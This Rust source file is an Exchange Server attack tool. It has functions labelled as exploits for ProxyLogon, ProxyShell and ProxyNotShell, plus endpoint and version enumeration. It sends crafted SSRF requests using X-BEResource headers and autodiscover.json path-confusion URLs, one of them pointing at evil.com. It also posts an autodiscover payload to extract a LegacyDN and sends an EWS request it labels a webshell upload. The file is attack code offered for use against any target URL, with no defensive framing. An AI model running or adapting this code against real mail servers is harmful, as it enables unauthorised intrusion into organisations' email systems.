use colored::Colorize;
use reqwest::Client;
use std::time::Duration;

fn build_client(timeout: u64) -> Client {
    Client::builder()
        .timeout(Duration::from_secs(timeout))
        .redirect(reqwest::redirect::Policy::none())
        .build()
        .unwrap_or_else(|_| Client::new())
}

pub async fn proxylogon(url: &str, timeout: u64) -> anyhow::Result<()> {
    println!(
        "{} Exchange ProxyLogon (CVE-2021-26855) Exploit",
        "[*]".cyan().bold()
    );
    println!("{}", "=".repeat(60).cyan());
    println!("{} Target: {}", "[*]".cyan().bold(), url);
    println!("{}", "-".repeat(60).dimmed());

    let client = build_client(timeout);
    let ssrf_paths = [
        "/ecp/y.js",
        "/ecp/DDI/DDIService.svc/GetObject",
        "/ecp/DDI/DDIService.svc/SetObject",
        "/autodiscover/autodiscover.xml",
    ];

    for path in &ssrf_paths {
        let target = format!("{}{}", url.trim_end_matches('/'), path);
        let headers = [
            ("X-ClientState", "y"),
            ("X-BEResource", "localhost/autodiscover/autodiscover.xml"),
            ("X-BEResource", "WIN-EXCHANGE/autodiscover/autodiscover.xml"),
        ];
        for (hkey, hval) in &headers {
            if let Ok(r) = client.get(&target).header(*hkey, *hval).send().await {
                let status = r.status().as_u16();
                let text = r.text().await.unwrap_or_default();
                if status == 200 && !text.is_empty() {
                    println!(
                        "  {} {:10} -> {:30} — {} bytes",
                        "[!]".red().bold(),
                        hkey,
                        path,
                        text.len()
                    );
                }
            }
        }
    }

    let legacy_dn_payload = r#"<?xml version="1.0" encoding="utf-8"?><Autodiscover xmlns="http://schemas.microsoft.com/exchange/autodiscover/outlook/requestschema/2006"><Request><EMailAddress>administrator@target.com</EMailAddress><AcceptableResponseSchema>http://schemas.microsoft.com/exchange/autodiscover/outlook/responseschema/2006a</AcceptableResponseSchema></Request></Autodiscover>"#;
    let target = format!(
        "{}/autodiscover/autodiscover.xml",
        url.trim_end_matches('/')
    );
    match client
        .post(&target)
        .header("Content-Type", "text/xml")
        .body(legacy_dn_payload)
        .send()
        .await
    {
        Ok(r) => {
            let status = r.status().as_u16();
            let text = r.text().await.unwrap_or_default();
            if status == 200 && (text.contains("LegacyDN") || text.contains("Server")) {
                println!(
                    "  {} Legacy DN extracted — ProxyLogon viable",
                    "[!]".red().bold()
                );
            } else {
                println!("  {} Autodiscover — status={}", "[-]".dimmed(), status);
            }
        }
        Err(_) => println!("  {} Autodiscover — error", "[-]".dimmed()),
    }

    Ok(())
}

pub async fn proxyshell(url: &str, timeout: u64) -> anyhow::Result<()> {
    println!(
        "{} Exchange ProxyShell (CVE-2021-34473) Exploit",
        "[*]".cyan().bold()
    );
    println!("{}", "=".repeat(60).cyan());
    println!("{} Target: {}", "[*]".cyan().bold(), url);
    println!("{}", "-".repeat(60).dimmed());

    let client = build_client(timeout);
    let proxyshell_paths = [
        (
            "/autodiscover/autodiscover.json?@evil.com/owa/&Email=autodiscover/autodiscover.json%3f@evil.com",
            "SSRF via autodiscover.json",
        ),
        (
            "/autodiscover/autodiscover.json?@target.com/mapi/npi/?&Email=administrator@target.com",
            "MAPI access",
        ),
        (
            "/autodiscover/autodiscover.json?@target.com/EWS/exchange.asmx",
            "EWS access",
        ),
        (
            "/autodiscover/autodiscover.json?@target.com/ecp/y.js",
            "ECP access",
        ),
    ];

    for (path, name) in &proxyshell_paths {
        let target = format!("{}{}", url.trim_end_matches('/'), path);
        match client.get(&target).send().await {
            Ok(r) => {
                let status = r.status().as_u16();
                let text = r.text().await.unwrap_or_default();
                if status == 200 && !text.is_empty() {
                    println!(
                        "  {} {:30} — {} bytes",
                        "[!]".red().bold(),
                        name,
                        text.len()
                    );
                } else {
                    println!("  {} {:30} — status={}", "[-]".dimmed(), name, status);
                }
            }
            Err(_) => println!("  {} {:30} — error", "[-]".dimmed(), name),
        }
    }

    let webshell = r#"<?xml version="1.0" encoding="utf-8"?><soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:m="http://schemas.microsoft.com/exchange/services/2006/messages" xmlns:t="http://schemas.microsoft.com/exchange/services/2006/types" xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/"><soap:Header><t:RequestServerVersion Version="Exchange2013"/></soap:Header><soap:Body><m:CreateItem><m:Items><t:Message><t:Subject>test</t:Subject><t:Body BodyType="HTML">cmd</t:Body></t:Message></m:Items></m:CreateItem></soap:Body></soap:Envelope>"#;
    let target = format!("{}/ews/exchange.asmx", url.trim_end_matches('/'));
    if let Ok(r) = client
        .post(&target)
        .header("Content-Type", "text/xml")
        .body(webshell)
        .send()
        .await
    {
        let status = r.status().as_u16();
        if status == 200 {
            println!("  {} EWS webshell upload — possible", "[!]".red().bold());
        }
    }

    Ok(())
}

pub async fn proxynotshell(url: &str, timeout: u64) -> anyhow::Result<()> {
    println!(
        "{} Exchange ProxyNotShell (CVE-2022-41040/41082) Exploit",
        "[*]".cyan().bold()
    );
    println!("{}", "=".repeat(60).cyan());
    println!("{} Target: {}", "[*]".cyan().bold(), url);
    println!("{}", "-".repeat(60).dimmed());

    let client = build_client(timeout);
    let paths = [
        (
            "/autodiscover/autodiscover.json?@target.com/PowerShell/?X-Rps-CAT=VssDiag",
            "PowerShell SSRF",
        ),
        (
            "/autodiscover/autodiscover.json?@target.com/RpcHttp/",
            "RPC HTTP SSRF",
        ),
        (
            "/autodiscover/autodiscover.json?@target.com/EWS/exchange.asmx",
            "EWS SSRF",
        ),
        (
            "/autodiscover/autodiscover.json?@target.com/ecp/DDI/DDIService.svc/SetObject",
            "ECP DDI",
        ),
        (
            "/autodiscover/autodiscover.json?@target.com/ecp/DDI/DDIService.svc/GetObject",
            "ECP DDI read",
        ),
    ];

    for (path, name) in &paths {
        let target = format!("{}{}", url.trim_end_matches('/'), path);
        match client.get(&target).send().await {
            Ok(r) => {
                let status = r.status().as_u16();
                let text = r.text().await.unwrap_or_default();
                if status == 200 && !text.is_empty() {
                    println!(
                        "  {} {:25} — {} bytes",
                        "[!]".red().bold(),
                        name,
                        text.len()
                    );
                } else {
                    println!("  {} {:25} — status={}", "[-]".dimmed(), name, status);
                }
            }
            Err(_) => println!("  {} {:25} — error", "[-]".dimmed(), name),
        }
    }

    Ok(())
}

pub async fn enumerate(url: &str, timeout: u64) -> anyhow::Result<()> {
    println!("{} Exchange Server Enumeration", "[*]".cyan().bold());
    println!("{}", "=".repeat(60).cyan());
    println!("{} Target: {}", "[*]".cyan().bold(), url);
    println!("{}", "-".repeat(60).dimmed());

    let client = build_client(timeout);
    let enum_endpoints = [
        ("/owa", "OWA portal"),
        ("/ecp", "ECP admin"),
        ("/ews/exchange.asmx", "EWS service"),
        ("/autodiscover/autodiscover.xml", "Autodiscover"),
        ("/mapi", "MAPI"),
        ("/rpc", "RPC endpoint"),
        ("/oab", "Offline Address Book"),
        ("/ews", "EWS root"),
        ("/Microsoft-Server-ActiveSync", "ActiveSync"),
        ("/ews/services.wsdl", "EWS WSDL"),
    ];

    for (path, name) in &enum_endpoints {
        let target = format!("{}{}", url.trim_end_matches('/'), path);
        if let Ok(r) = client.get(&target).send().await {
            let status = r.status().as_u16();
            let server = r
                .headers()
                .get("server")
                .map(|v| v.to_str().unwrap_or(""))
                .unwrap_or("");
            if status == 200 || status == 401 || status == 403 {
                println!(
                    "  {} {:30} — status={} server={}",
                    "[+]".green().bold(),
                    name,
                    status,
                    server
                );
            }
        }
    }

    let version_endpoints = [
        "/owa/auth/15.1.2176.2/themes/resources/owafont.css",
        "/owa/auth/15.2.986.5/themes/resources/owafont.css",
    ];
    for vp in &version_endpoints {
        let target = format!("{}{}", url.trim_end_matches('/'), vp);
        if let Ok(r) = client.get(&target).send().await
            && r.status().as_u16() == 200
        {
            let ver = vp.split('/').nth(3).unwrap_or("unknown");
            println!(
                "  {} Exchange version detected: {}",
                "[!]".red().bold(),
                ver
            );
        }
    }

    Ok(())
}
